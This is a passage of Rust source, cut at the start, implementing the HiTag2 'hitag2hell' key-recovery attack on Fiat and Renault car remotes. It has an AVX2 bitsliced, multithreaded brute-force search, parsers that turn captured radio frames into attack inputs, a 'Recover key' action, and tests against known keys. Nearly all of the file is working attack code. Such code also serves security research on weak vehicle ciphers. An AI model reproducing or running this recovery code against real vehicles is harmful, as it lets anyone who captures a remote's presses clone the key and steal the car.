            s[11] = guess(i3, 0);
            s[20] = guess(i3, 1);
            s[37] = guess(i3, 2);
            let filter3 = f_c(filter3_0, g1(&s, 3), g2(&s, 3), filter3_3, g4(&s, 3));
            let results3 = results2 & (filter3 ^ ks[3]);
            if !results3.any() {
                continue;
            }
            s[51] = lfsr_bs(&s, 3);
            s[52] = lfsr_bs(&s, 4);
            s[53] = lfsr_bs(&s, 5);
            s[54] = lfsr_bs(&s, 6);
            s[55] = lfsr_bs(&s, 7);
            let filter4_3 = g3(&s, 4);
            let filter5_0 = g0(&s, 5);
            let filter5_1 = g1(&s, 5);
            let filter6_0 = g0(&s, 6);
            let filter6_1 = g1(&s, 6);
            let filter8_0 = g0(&s, 8);
            let filter8_1 = g1(&s, 8);
            let filter9_0 = g0(&s, 9);
            let filter9_4 = g4(&s, 9);
            let filter11_2 = g2(&s, 11);
            let filter12_1 = g1(&s, 12);
            let filter14_0 = g0(&s, 14);
            let filter15_0 = g0(&s, 15);
            let filter17_0 = g0(&s, 17);
            for i4 in 0..2u32 {
                s[38] = guess(i4, 0);
                let filter4 = f_c(filter4_0, filter4_1, filter4_2, filter4_3, g4(&s, 4));
                let results4 = results3 & (filter4 ^ ks[4]);
                if !results4.any() {
                    continue;
                }
                s[56] = lfsr_bs(&s, 8);
                let filter5_3 = g3(&s, 5);
                let filter10_4 = g4(&s, 10);
                let filter12_2 = g2(&s, 12);
                for i5 in 0..2u32 {
                    s[39] = guess(i5, 0);
                    let filter5 = f_c(filter5_0, filter5_1, filter5_2, filter5_3, g4(&s, 5));
                    let results5 = results4 & (filter5 ^ ks[5]);
                    if !results5.any() {
                        continue;
                    }
                    s[57] = lfsr_bs(&s, 9);
                    let filter6_3 = g3(&s, 6);
                    let filter11_4 = g4(&s, 11);
                    let filter13_2 = g2(&s, 13);
                    for i6 in 0..2u32 {
                        s[40] = guess(i6, 0);
                        let filter6 = f_c(filter6_0, filter6_1, filter6_2, filter6_3, g4(&s, 6));
                        let results6 = results5 & (filter6 ^ ks[6]);
                        if !results6.any() {
                            continue;
                        }
                        s[58] = lfsr_bs(&s, 10);
                        let filter7_3 = g3(&s, 7);
                        let filter12_4 = g4(&s, 12);
                        let filter14_2 = g2(&s, 14);
                        let filter17_2 = g2(&s, 17);
                        for i7 in 0..2u32 {
                            s[41] = guess(i7, 0);
                            let filter7 = f_c(filter7_0, filter7_1, filter7_2, filter7_3, g4(&s, 7));
                            let results7 = results6 & (filter7 ^ ks[7]);
                            if !results7.any() {
                                continue;
                            }
                            s[59] = lfsr_bs(&s, 11);
                            let filter8_3 = g3(&s, 8);
                            let filter10 = f_c(filter10_0, filter10_1, filter10_2, g3(&s, 10), filter10_4);
                            let filter12 = f_c(filter12_0, filter12_1, filter12_2, g3(&s, 12), filter12_4);
                            let filter13_4 = g4(&s, 13);
                            let filter15_2 = g2(&s, 15);
                            'i8: for i8 in 0..2u32 {
                                s[42] = guess(i8, 0);
                                let filter8 = f_c(filter8_0, filter8_1, filter8_2, filter8_3, g4(&s, 8));
                                let mut results8 = results7 & (filter8 ^ ks[8]);
                                if !results8.any() {
                                    continue;
                                }
                                let filter9 = f_c(filter9_0, filter9_1, filter9_2, g3(&s, 9), filter9_4);
                                results8 = results8 & (filter9 ^ ks[9]);
                                if !results8.any() {
                                    continue;
                                }
                                results8 = results8 & (filter10 ^ ks[10]);
                                if !results8.any() {
                                    continue;
                                }
                                let filter11 = f_c(filter11_0, filter11_1, filter11_2, g3(&s, 11), filter11_4);
                                results8 = results8 & (filter11 ^ ks[11]);
                                if !results8.any() {
                                    continue;
                                }
                                results8 = results8 & (filter12 ^ ks[12]);
                                if !results8.any() {
                                    continue;
                                }
                                let filter13 = f_c(filter13_0, filter13_1, filter13_2, g3(&s, 13), filter13_4);
                                results8 = results8 & (filter13 ^ ks[13]);
                                if !results8.any() {
                                    continue;
                                }
                                s[60] = lfsr_bs(&s, 12);
                                let filter14 = f_c(filter14_0, filter14_1, filter14_2, g3(&s, 14), g4(&s, 14));
                                results8 = results8 & (filter14 ^ ks[14]);
                                if !results8.any() {
                                    continue;
                                }
                                s[61] = lfsr_bs(&s, 13);
                                let filter15 = f_c(filter15_0, filter15_1, filter15_2, filter15_3, g4(&s, 15));
                                results8 = results8 & (filter15 ^ ks[15]);
                                if !results8.any() {
                                    continue;
                                }
                                s[62] = lfsr_bs(&s, 14);
                                let filter16 = f_c(filter16_0, filter16_1, g2(&s, 16), filter16_3, g4(&s, 16));
                                results8 = results8 & (filter16 ^ ks[16]);
                                if !results8.any() {
                                    continue;
                                }
                                s[63] = lfsr_bs(&s, 15);
                                let filter17 = f_c(filter17_0, filter17_1, filter17_2, filter17_3, g4(&s, 17));
                                results8 = results8 & (filter17 ^ ks[17]);
                                if !results8.any() {
                                    continue;
                                }
                                // Keystream bits 18..=31: every register bit is known, each new
                                // one is an LFSR output (`state[-2+64] = lfsr_bs(16)` …).
                                for t in 18..32 {
                                    s[t + 46] = lfsr_bs(&s, t - 2);
                                    let filter = f_c(g0(&s, t), g1(&s, t), g2(&s, t), g3(&s, t), g4(&s, t));
                                    results8 = results8 & (filter ^ ks[t]);
                                    if !results8.any() {
                                        continue 'i8;
                                    }
                                }
                                // Save results: the register from layer 2 (bits 2..=49).
                                results8.for_each_set(|lane| {
                                    let mut state = 0u64;
                                    for word in s[2..50].iter().rev() {
                                        state = (state << 1) | word.lane(lane);
                                    }
                                    out.push(state);
                                });
                            }
                        }
                    }
                }
            }
        }
    }
}

/// Position of a kernel match in the single-thread C's output order — `i1`, then the `i2` … `i8`
/// loops, then the lane (the C emits high lanes first) — read back from the guessed bits
/// (bit `n` of the register is bit `n - 2` of the match).
fn c_order(raw: u64) -> u32 {
    let s = |n: usize| ((raw >> (n - 2)) & 1) as u32;
    let i1 = I1_BITS.iter().enumerate().fold(0, |acc, (b, &n)| acc | (s(n) << b));
    let i2 = s(10) | (s(19) << 1) | (s(25) << 2) | (s(36) << 3) | (s(49) << 4);
    let i3 = s(11) | (s(20) << 1) | (s(37) << 2);
    let lane = s(4) | (s(7) << 1) | (s(9) << 2) | (s(13) << 3) | (s(16) << 4);
    (i1 << 18)
        | (i2 << 13)
        | (i3 << 10)
        | (s(38) << 9)
        | (s(39) << 8)
        | (s(40) << 7)
        | (s(41) << 6)
        | (s(42) << 5)
        | (31 - lane)
}

/// Every kernel match of one candidate (all `i1`), in the kernel's emission order for this word.
#[inline(always)]
fn candidate_states<W: Lanes>(ks: &[W; 32], candidate: u64, out: &mut Vec<u64>) {
    let step = 1u32 << W::EXTRA;
    for i1 in (0..I1_SPAN).step_by(step as usize) {
        find_state(ks, candidate, i1, out);
    }
}

/// [`candidate_states`] for `X4`, compiled for AVX2 (the generic kernel is inlined into it).
#[cfg(target_arch = "x86_64")]
#[target_feature(enable = "avx2")]
unsafe fn candidate_states_avx2(ks: &[X4; 32], candidate: u64, out: &mut Vec<u64>) {
    candidate_states(ks, candidate, out);
}

/// Whether this CPU runs the AVX2 build of the kernel.
fn has_avx2() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        std::is_x86_feature_detected!("avx2")
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

/// Lane word of a search. Searches use `W256`; the others are kept for the C-parity tests and
/// the benchmark (`bench_lane_widths`).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Width {
    /// The C's 32-lane word.
    #[cfg_attr(not(test), allow(dead_code))]
    W32,
    #[cfg_attr(not(test), allow(dead_code))]
    W64,
    /// 256 lanes; AVX2 when the CPU has it.
    W256,
}

/// The per-hop kernel inputs: candidates and the keystream for each word type.
struct Kernel {
    candidates: Vec<u64>,
    ks32: [u32; 32],
    ks64: [u64; 32],
    ks256: [X4; 32],
    width: Width,
    avx2: bool,
}

impl Kernel {
    fn new(hop: u32, width: Width) -> Self {
        Self::with_candidates(hop, width, layer0(hop))
    }

    /// A kernel for `hop` with its precomputed [`layer0`] candidates.
    fn with_candidates(hop: u32, width: Width, candidates: Vec<u64>) -> Self {
        Self {
            candidates,
            ks32: bitslice_keystream(hop),
            ks64: bitslice_keystream(hop),
            ks256: bitslice_keystream(hop),
            width,
            avx2: has_avx2(),
        }
    }

    /// The matches of candidate `c`, in the single-thread C's order (the `u32` kernel emits them
    /// in that order already; wider words interleave `i1` values).
    fn states(&self, c: u32, out: &mut Vec<u64>) {
        out.clear();
        let candidate = self.candidates[c as usize];
        match self.width {
            Width::W32 => candidate_states(&self.ks32, candidate, out),
            Width::W64 => candidate_states(&self.ks64, candidate, out),
            // SAFETY: `avx2` comes from `has_avx2()`, i.e. the CPU supports AVX2.
            #[cfg(target_arch = "x86_64")]
            Width::W256 if self.avx2 => unsafe { candidate_states_avx2(&self.ks256, candidate, out) },
            Width::W256 => candidate_states(&self.ks256, candidate, out),
        }
        out.sort_unstable_by_key(|&raw| c_order(raw));
    }
}

// ---------------------------------------------------------------------------------------------
// Search (hitag2hell_recover_cpu_ex, early stop as hitag2hell_cpu_worker), multithreaded
// ---------------------------------------------------------------------------------------------

/// Cancel flag and progress counter for a running search (qDoctor's shared `cancel` flag and
/// polled progress cell; progress counts layer-0 candidates, out of [`SEARCH_TOTAL`]).
#[derive(Debug, Default)]
pub struct BruteForceControl {
    pub cancel: AtomicBool,
    pub progress: AtomicU32,
}

/// Result of a search (qDoctor rc 1 / 0 / -1).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BruteForceOutcome {
    Found(RecoveredKey),
    NotFound,
    Cancelled,
}

/// Run `check` on the matches (`states`) of every candidate in `range` (all cores, candidates
/// claimed in increasing order) and return the lowest candidate it accepts. A candidate in
/// progress is always finished, so every candidate below a hit was checked, even after a cancel.
fn search<T: Send>(
    range: Range<u32>,
    ctl: &BruteForceControl,
    states: impl Fn(u32, &mut Vec<u64>) + Sync,
    check: impl Fn(u32, &[u64]) -> Option<T> + Sync,
) -> Result<Option<(u32, T)>, ()> {
    let end = range.end;
    let next = AtomicU32::new(range.start);
    let best = AtomicU32::new(u32::MAX);
    let hit: Mutex<Option<(u32, T)>> = Mutex::new(None);
    let span = end.saturating_sub(range.start).max(1) as usize;
    let workers = std::thread::available_parallelism().map_or(1, |n| n.get()).clamp(1, span);
    std::thread::scope(|scope| {
        for _ in 0..workers {
            scope.spawn(|| {
                let mut found_states = Vec::new();
                loop {
                    if ctl.cancel.load(Ordering::Relaxed) {
                        break;
                    }
                    let c = next.fetch_add(1, Ordering::Relaxed);
                    if c >= end || c > best.load(Ordering::Relaxed) {
                        break;
                    }
                    states(c, &mut found_states);
                    if let Some(found) = check(c, &found_states) {
                        best.fetch_min(c, Ordering::Relaxed);
                        let mut slot = hit.lock().unwrap();
                        if slot.as_ref().is_none_or(|(prev, _)| c < *prev) {
                            *slot = Some((c, found));
                        }
                    }
                    ctl.progress.fetch_add(1, Ordering::Relaxed);
                }
            });
        }
    });
    match hit.into_inner().unwrap() {
        Some(found) => Ok(Some(found)),
        None if ctl.cancel.load(Ordering::Relaxed) => Err(()),
        None => Ok(None),
    }
}

/// [`recover_key_any`] over layer-0 candidates `range` with lane word `width`.
fn recover_in(reqs: &[Hitag2Request], range: Range<u32>, width: Width, ctl: &BruteForceControl) -> BruteForceOutcome {
    match reqs.first() {
        Some(first) => recover_with(&Kernel::new(first.hop, width), reqs, range, ctl),
        None => BruteForceOutcome::NotFound,
    }
}

/// [`recover_in`] with a prepared kernel (for the requests' hop).
fn recover_with(kernel: &Kernel, reqs: &[Hitag2Request], range: Range<u32>, ctl: &BruteForceControl) -> BruteForceOutcome {
    let Some(first) = reqs.first() else {
        return BruteForceOutcome::NotFound;
    };
    if reqs.iter().any(|r| r.hop != first.hop) {
        return BruteForceOutcome::NotFound;
    }
    let range = range.start..range.end.min(kernel.candidates.len() as u32);
    let check = |c: u32, states: &[u64]| {
        states.iter().find_map(|&raw| {
            reqs.iter().enumerate().find_map(|(request, req)| {
                verify_state(req, raw).map(|(key, uid, state)| RecoveredKey { key, uid, state, request, candidate: c })
            })
        })
    };
    match search(range, ctl, |c, out| kernel.states(c, out), check) {
        Ok(Some((_, key))) => BruteForceOutcome::Found(key),
        Ok(None) => BruteForceOutcome::NotFound,
        Err(()) => BruteForceOutcome::Cancelled,
    }
}

/// The lane word searches use.
fn default_width() -> Width {
    Width::W256
}

/// The "Recover key (HiTag2)" action: qDoctor's `doctor_hitag2hell_recover` on one request. Run
/// it off the UI thread; it honours `ctl.cancel` and advances `ctl.progress` (out of
/// [`SEARCH_TOTAL`]). Without a second frame the first consistent key is returned (one of ~2^16).
/// The app passes every IV reading of its two captures to [`recover_key_any`] instead.
#[cfg_attr(not(test), allow(dead_code))]
pub fn recover_key(req: &Hitag2Request, ctl: &BruteForceControl) -> BruteForceOutcome {
    recover_key_any(std::slice::from_ref(req), ctl)
}

/// One search for several IV readings of the same frames (all requests must share the hop; see
/// [`requests_for`]): per state, the requests are checked in order. Found carries the index of
/// the request that verified.
pub fn recover_key_any(reqs: &[Hitag2Request], ctl: &BruteForceControl) -> BruteForceOutcome {
    recover_in(reqs, 0..SEARCH_TOTAL, default_width(), ctl)
}

// ---------------------------------------------------------------------------------------------
// KAT protocols → requests (qDoctor hitag2_sub.dart; ARF's Fiat V2 IV readings)
// ---------------------------------------------------------------------------------------------

/// HITAG2 car-remote protocols KAT decodes whose frames carry the attack's inputs.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Hitag2Remote {
    FiatV1,
    RenaultV1,
    FiatV2,
}

/// One received frame in the attack's terms (qDoctor's `Hitag2Signal`).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Hitag2Frame {
    pub remote: Hitag2Remote,
    pub uid: u32,
    pub hop: u32,
    /// Fiat V1 / Renault V1: the 10-bit counter. Fiat V2: the 11- or 14-bit counter.
    pub cnt: u32,
    /// Fiat V1 / Renault V1: the 4-bit button. Fiat V2: the 2-bit selector (raw\[7\] >> 6).
    pub btn: u8,
}

impl Hitag2Frame {
    /// The (counter, button) IV readings tried for this frame: the frame's own for Fiat V1 /
    /// Renault V1; for Fiat V2 the 10-bit counter with Flipper-ARF's two `fiat_v2_iv_button`
    /// options, the raw selector (ARF combo 0, qDoctor's reading) and its one-hot remap (combo 1).
    /// ARF's complemented counter (`fiat_v2_iv_control` option 2, combos 2 and 3) is left out: the
    /// cipher XORs IV and key bits, so it is combo 0 / 1 with the key XOR `0x3FF << 4` and no set
    /// of frames can tell them apart (the search would return that equivalent key under combo 0).
    fn readings(&self) -> Vec<(u32, u8)> {
        match self.remote {
            Hitag2Remote::FiatV1 | Hitag2Remote::RenaultV1 => vec![(self.cnt, self.btn)],
            Hitag2Remote::FiatV2 => {
                let one_hot = match self.btn {
                    1 => 0x2,
                    2 => 0x4,
                    3 => 0x8,
                    _ => 0x0,
                };
                let cnt = self.cnt & 0x3FF;
                vec![(cnt, self.btn), (cnt, one_hot)]
            }
        }
    }

    /// Fiat V1 and Renault V1 share frame and cipher; Fiat V2 pairs only with Fiat V2.
    fn same_family(&self, other: &Hitag2Frame) -> bool {
        (self.remote == Hitag2Remote::FiatV2) == (other.remote == Hitag2Remote::FiatV2)
    }
}

/// The 104-bit `00 01 uid btn/cnt hop tail xor` frame of Fiat V1 / Renault V1 from a decode
/// (`data` = wire bytes 0..8, `extra` = bytes 8..13; Fiat V1 keeps its TE variant at bit 40).
fn frame13(signal: &DecodedSignal) -> Option<[u8; 13]> {
    if signal.data_count_bit != 104 {
        return None;
    }
    let extra = signal.extra? & 0xFF_FFFF_FFFF;
    let mut raw = [0u8; 13];
    raw[..8].copy_from_slice(&signal.data.to_be_bytes());
    raw[8..].copy_from_slice(&extra.to_be_bytes()[3..]);
    let xor = raw[2..12].iter().fold(0u8, |acc, b| acc ^ b);
    (raw[0] == 0x00 && raw[1] == 0x01 && xor == raw[12]).then_some(raw)
}

/// The 112-bit Fiat V2 frame from a decode (`data` = bytes 0..8, `extra` = bytes 8..14).
fn frame14(signal: &DecodedSignal) -> Option<[u8; 14]> {
    if signal.data_count_bit != 112 {
        return None;
    }
    let extra = signal.extra?;
    if extra >> 48 != 0 {
        return None;
    }
    let mut raw = [0u8; 14];
    raw[..8].copy_from_slice(&signal.data.to_be_bytes());
    raw[8..].copy_from_slice(&extra.to_be_bytes()[2..]);
    (raw[0] == 0x00 && raw[1] == 0x01 && matches!(raw[7] >> 6, 1..=3)).then_some(raw)
}

/// A decoded frame of `protocol` (the capture's protocol name) as attack input — qDoctor's
/// `Hitag2Sub` field extraction (`_parseFiatRaw`, `_parseRenaultV1Frame`, `_parseFiatV2Raw`).
/// The error is a user-facing reason.
pub fn frame_of(protocol: &str, signal: &DecodedSignal) -> Result<Hitag2Frame, String> {
    let remote = match protocol {
        "Fiat V1" => Hitag2Remote::FiatV1,
        "Renault V1" => Hitag2Remote::RenaultV1,
        "Fiat V2" => Hitag2Remote::FiatV2,
        p if p.starts_with("Renault V1 (ARF)") => {
            return Err("Renault V1 (ARF) frames carry no fixed 32-bit hop and only a 24-bit serial".into())
        }
        "Datsun Lada" => return Err("Datsun Lada's key is fixed (0x4606 + serial); nothing to recover".into()),
        _ => return Err(format!("{protocol} is not a HITAG2 remote KAT can attack")),
    };
    if remote == Hitag2Remote::FiatV2 {
        let raw = frame14(signal).ok_or("not a valid Fiat V2 frame")?;
        let fca = raw[6] & 0xF0 == 0xD0;
        let (hop, cnt) = if fca {
            let raw_cnt = (u32::from(raw[8]) << 6) | u32::from(raw[9] >> 2);
            (u32::from_be_bytes([raw[10], raw[11], raw[12], raw[13]]), !raw_cnt & 0x3FFF)
        } else {
            let raw_cnt = (u32::from(raw[7] & 0x3F) << 5) | u32::from(raw[8] >> 3);
            (u32::from_be_bytes([raw[9], raw[10], raw[11], raw[12]]), !raw_cnt & 0x7FF)
        };
        let uid = u32::from_be_bytes([raw[2], raw[3], raw[4], raw[5]]);
        return Ok(Hitag2Frame { remote, uid, hop, cnt, btn: raw[7] >> 6 });
    }
    let raw = frame13(signal).ok_or_else(|| format!("not a valid {protocol} frame"))?;
    if remote == Hitag2Remote::RenaultV1 {
        let payload: [u8; 11] = raw[2..].try_into().unwrap();
        if hitag2::renault_seed_recover(&payload).is_some() {
            return Err("serial-derived key (seed recovered): KAT already transmits this remote".into());
        }
    }
    let uid = u32::from_be_bytes([raw[2], raw[3], raw[4], raw[5]]);
    let btn = raw[6] >> 4;
    let cnt = (u32::from(raw[6] & 0x0F) << 6) | u32::from(raw[7] >> 2);
    let hop = (u32::from(raw[7] & 0x03) << 30)
        | (u32::from(raw[8]) << 22)
        | (u32::from(raw[9]) << 14)
        | (u32::from(raw[10]) << 6)
        | u32::from(raw[11] >> 2);
    Ok(Hitag2Frame { remote, uid, hop, cnt, btn })
}

/// The requests for a frame and an optional second press of the same remote (qDoctor's
/// `loadSelected` checks: same protocol family, same UID; KAT also refuses the same press
/// twice). One request per IV reading, for [`recover_key_any`].
pub fn requests_for(first: &Hitag2Frame, second: Option<&Hitag2Frame>) -> Result<Vec<Hitag2Request>, String> {
    if let Some(f2) = second {
        if !first.same_family(f2) {
            return Err("the two captures are different protocols".into());
        }
        if f2.uid != first.uid {
            return Err("the two captures have different UIDs".into());
        }
        if f2.hop == first.hop {
            return Err("the two captures are the same press (same hop)".into());
        }
    }
    let r1 = first.readings();
    let r2 = second.map(|f| f.readings());
    Ok(r1
        .iter()
        .enumerate()
        .map(|(i, &(cnt, btn))| Hitag2Request {
            hop: first.hop,
            uid: first.uid,
            cnt,
            btn,
            second: second.zip(r2.as_ref()).map(|(f2, r2)| SecondFrame { hop: f2.hop, cnt: r2[i].0, btn: r2[i].1 }),
        })
        .collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Small deterministic PRNG for property tests.
    struct XorShift(u64);
    impl XorShift {
        fn next(&mut self) -> u64 {
            self.0 ^= self.0 << 13;
            self.0 ^= self.0 >> 7;
            self.0 ^= self.0 << 17;
            self.0
        }
    }

    /// FNV-1a over the little-endian bytes of each value (the oracle harness's `fnv`).
    fn fnv(values: &[u64]) -> u64 {
        let mut h = 0xCBF2_9CE4_8422_2325u64;
        for v in values {
            for byte in v.to_le_bytes() {
                h ^= byte as u64;
                h = h.wrapping_mul(0x0100_0000_01B3);
            }
        }
        h
    }

    /// [`layer0`], computed once per hop for all tests (keeps the debug-build tests quick).
    fn cached_layer0(hop: u32) -> Vec<u64> {
        static CACHE: std::sync::OnceLock<Mutex<std::collections::HashMap<u32, Vec<u64>>>> = std::sync::OnceLock::new();
        let cache = CACHE.get_or_init(Default::default);
        if let Some(c) = cache.lock().unwrap().get(&hop) {
            return c.clone();
        }
        let c = layer0(hop);
        cache.lock().unwrap().insert(hop, c.clone());
        c
    }

    fn kernel(hop: u32, width: Width) -> Kernel {
        Kernel::with_candidates(hop, width, cached_layer0(hop))
    }

    /// [`recover_in`] on a cached kernel.
    fn recover_range(reqs: &[Hitag2Request], range: Range<u32>, width: Width) -> BruteForceOutcome {
        recover_with(&kernel(reqs[0].hop, width), reqs, range, &BruteForceControl::default())
    }

    /// Layer-0 index of a register after init (its candidate is `init`'s taps, shifted).
    fn candidate_of(hop: u32, init: u64) -> u32 {
        cached_layer0(hop).binary_search(&((init & LAYER0_MASK) >> 2)).unwrap() as u32
    }

    /// Known-key frames: (key, uid, (cnt, btn, hop), (cnt2, btn2, hop2), init, layer-2 match,
    /// layer-0 candidate) — hops, registers and candidate indices from the compiled qDoctor C
    /// (`hitag2hell_authenticator`, `hitag2hell_init`, the kernel's match, the candidate's rank
    /// in `hitag2hell_layer0`). The keys are hitag2.rs's C-test Renault keys.
    type KnownFrames = (u64, u32, (u32, u8, u32), (u32, u8, u32), u64, u64, u32);
    const KNOWN: [KnownFrames; 3] = [
        (0xA5E4_2428_CA6D, 0x9496_06B3, (0x13D, 8, 0xF003_694F), (0x13E, 8, 0xD42B_01C8), 0x3D32_6E0A_27A5, 0x0F4C_9B82_89E9, 218_509),
        (0x702C_A29C_EB21, 0x0C38_6144, (0x04D, 9, 0xD4A9_F1AA), (0x04E, 9, 0xC7A9_1022), 0xEF49_37C4_340E, 0xBBD2_4DF1_0D03, 334_491),
        (0x4D34_3FD4_E7B6, 0x1234_5678, (0x3FF, 4, 0xCEED_6660), (0x000, 4, 0xF2A4_755A), 0xD8FA_12B7_2CB2, 0x363E_84AD_CB2C, 478_658),
    ];

    fn known_request(k: &KnownFrames) -> Hitag2Request {
        let (_, uid, (cnt, btn, hop), (cnt2, btn2, hop2), ..) = *k;
        Hitag2Request { hop, uid, cnt, btn, second: Some(SecondFrame { hop: hop2, cnt: cnt2, btn: btn2 }) }
    }

    /// The scalar cipher is qDoctor's (`hitag2hell_authenticator` vectors from the C) and is
    /// hitag2.rs's Renault authenticator with [`key_bytes`] and its Fiat BCM authenticator with
    /// [`fiat_bcm_key`] (epoch = counter bits 10+).
    #[test]
    fn cipher_matches_c_and_hitag2_rs() {
        for k in &KNOWN {
            let (key, uid, (cnt, btn, hop), (cnt2, btn2, hop2), init_state, ..) = *k;
            assert_eq!(authenticator(key, uid, cnt, btn), hop);
            assert_eq!(authenticator(key, uid, cnt2, btn2), hop2);
            assert_eq!(init(key, uid, cnt, btn), init_state);
        }
        assert_eq!(authenticator(0xA5E4_2428_CA6D, 0x9496_06B3, 0x13F, 4), 0xE492_1AD4);
        assert_eq!(authenticator(0xCC37_B792_80AE, 0xEFB8_2D66, 0x08D, 2), 0xBE8C_C541);
        let mut rng = XorShift(0x4E11_0000_C0DE_0001);
        for _ in 0..200 {
            let key = rng.next() & MASK48;
            let uid = rng.next() as u32;
            let ctl = (rng.next() & 0x3FF) as u32;
            let epoch = (rng.next() & 0x3FFFF) as u32;
            let btn = (rng.next() & 0xF) as u8;
            let cnt = (epoch << 10) | ctl;
            let hop = authenticator(key, uid, cnt, btn);
            assert_eq!(hitag2::renault_authenticator(uid, btn, cnt, &key_bytes(key)), hop);
            assert_eq!(hitag2::fiat_bcm_authenticator(uid, btn, ctl as u16, &fiat_bcm_key(key), epoch), hop);
        }
    }

    /// `f_a_bs` / `f_b_bs` / `f_c_bs` are f20's tables 0x3C65 / 0xEE5 / 0xDD3929B (first input =
    /// index MSB), and the bitsliced filter of keystream bit 0 is `hitag2hell_f20`.
    #[test]
    fn bitsliced_filters_are_f20() {
        let bit = |v: u32, k: u32| u32::splat((v >> k) & 1 == 1);
        for i in 0..16u32 {
            let (a, b, c, d) = (bit(i, 3), bit(i, 2), bit(i, 1), bit(i, 0));
            assert_eq!(f_a(a, b, c, d).lane(0) as u32, (0x3C65 >> i) & 1, "f_a {i:04b}");
            assert_eq!(f_b(a, b, c, d).lane(0) as u32, (0x0EE5 >> i) & 1, "f_b {i:04b}");
        }
        for i in 0..32u32 {
            let w = f_c(bit(i, 4), bit(i, 3), bit(i, 2), bit(i, 1), bit(i, 0));
            assert_eq!(w.lane(0) as u32, (0x0DD3_929B >> i) & 1, "f_c {i:05b}");
        }
        let mut rng = XorShift(0xF20F_20F2_0F20_0001);
        for _ in 0..2000 {
            let state = rng.next() & MASK48;
            let s: Bits<u64> = std::array::from_fn(|n| u64::splat(n < 48 && (state >> n) & 1 == 1));
            let f = f_c(g0(&s, 0), g1(&s, 0), g2(&s, 0), g3(&s, 0), g4(&s, 0));
            assert_eq!(f.lane(0), f20(state), "{state:012X}");
            // lfsr_bs(0) is the feedback bit lfsr() inserts.
            assert_eq!(lfsr_bs(&s, 0).lane(0), lfsr(state) >> 47);
        }
    }

    /// `hitag2hell_layer0` from the C: count, first / last / 1000th candidate and an FNV-1a over
    /// all 524288 candidates in order, for a hop of each first bit.
    #[test]
    fn layer0_matches_c() {
        let cases = [
            (0x7AFC_C042u32, [0x0, 0x3, 0x8], 0x1601_AD28_B41Bu64, 0x0108_2400u64, 0x7554_F45A_1040_46E5u64),
            (0xF003_694F, [0x1, 0x2, 0xB], 0x1601_AD28_B45B, 0x0028_0440, 0x8539_017C_F933_3165),
        ];
        for (hop, first, last, c1000, hash) in cases {
            let cands = cached_layer0(hop);
            assert_eq!(cands.len(), SEARCH_TOTAL as usize, "{hop:08X}");
            assert_eq!(cands[..3], first);
            assert_eq!((cands[SEARCH_TOTAL as usize - 1], cands[1000]), (last, c1000));
            assert_eq!(fnv(&cands), hash, "{hop:08X}");
        }
        // The table form of expand_taps is the C's bit loop.
        let mut rng = XorShift(0x1A7E_7000_0000_0001);
        for _ in 0..1000 {
            let i = (rng.next() & 0xF_FFFF) as u32;
            assert_eq!(expand_taps(i & 0x3FF) | expand_taps(i & !0x3FF), expand_taps(i));
        }
    }

    /// `hitag2hell_lfsr_inv`, `_finish_state` and `_equiv_key` against the C (incl. a counter ≥ 1024:
    /// its bits 10+ are dropped, the nonce-high-bits rule).
    #[test]
    fn finish_and_equiv_key_match_c() {
        assert_eq!(lfsr_inv(0x1234_5678_9ABC), 0x2468_ACF1_3578);
        assert_eq!(finish_state(0x1234_5678_9ABC), 0x48D1_59E2_6AF1);
        assert_eq!((lfsr_inv(MASK48), finish_state(MASK48)), (0xFFFF_FFFF_FFFE, 0xFFFF_FFFF_FFFC));
        assert_eq!(equiv_key(0x3D32_6E0A_27A5, 0x9496_06B3, 0x13D, 8), 0xA5E4_2428_CA6D);
        assert_eq!(equiv_key(0x3D32_6E0A_27A5, 0x9496_06B3, 0x4D3D, 8), 0xA5E4_2428_CA6D);
        assert_eq!(equiv_key(0x9E37_79B9_7F4A, 0x0BAD_F00D, 0x2A5, 0xC), 0x52FE_023D_A743);
        for k in &KNOWN {
            let (key, uid, (cnt, btn, _), _, init_state, layer2, _) = *k;
            assert_eq!(lfsr(lfsr(init_state)), layer2);
            assert_eq!(finish_state(layer2), init_state);
            assert_eq!(equiv_key(init_state, uid, cnt, btn), key);
        }
        let mut rng = XorShift(0x0BAC_CA11_0000_0001);
        for _ in 0..1000 {
            let s = rng.next() & MASK48;
            assert_eq!(lfsr_inv(lfsr(s)), s);
            // Any register is some key's: equiv_key inverts init for counters below 1024.
            let (uid, cnt, btn) = (rng.next() as u32, (rng.next() & 0x3FF) as u32, (rng.next() & 0xF) as u8);
            assert_eq!(init(equiv_key(s, uid, cnt, btn), uid, cnt, btn), s);
        }
    }

    /// The kernel's matches equal the C's (`hitag2hell_find_state_cpu` over all 1024 `i1`, in
    /// emission order) for every lane word: the known keys' candidates, and two candidates of hop
    /// F003694F with two matches each — the C emits 78080's in descending numeric order. The
    /// `u32` kernel emits them in the C's order itself ([`c_order`] leaves it unchanged).
    #[test]
    fn kernel_matches_c_on_known_candidates() {
        let mut cases: Vec<(u32, u32, Vec<u64>)> = KNOWN[..2].iter().map(|k| (k.2 .2, k.6, vec![k.5])).collect();
        cases.push((0xF003_694F, 4352, vec![0x20FA_5ACD_1945, 0x610E_0A08_10C1]));
        cases.push((0xF003_694F, 78080, vec![0xC39E_3AA5_0944, 0xC2EE_78A4_0B40]));
        for (hop, cand, want) in cases {
            let candidate = cached_layer0(hop)[cand as usize];
            let mut raw = Vec::new();
            candidate_states(&bitslice_keystream::<u32>(hop), candidate, &mut raw);
            assert_eq!(raw, want, "{hop:08X} candidate {cand}");
            let mut sorted = raw.clone();
            sorted.sort_by_key(|&r| c_order(r));
            assert_eq!(sorted, want, "c_order is the C's emission order");
            // The search's word (AVX2 when available), the portable X4 and, in release builds,
            // u64; each sorted back into C order.
            let mut kernels = vec![kernel(hop, Width::W256)];
            if has_avx2() {
                kernels.push(Kernel { avx2: false, ..kernel(hop, Width::W256) });
            }
            if !cfg!(debug_assertions) {
                kernels.push(kernel(hop, Width::W64));
            }
            for k in &kernels {
                let mut states = Vec::new();
                k.states(cand, &mut states);
                assert_eq!(states, want, "{:?} (AVX2 {}) candidate {cand}", k.width, k.avx2);
            }
        }
    }

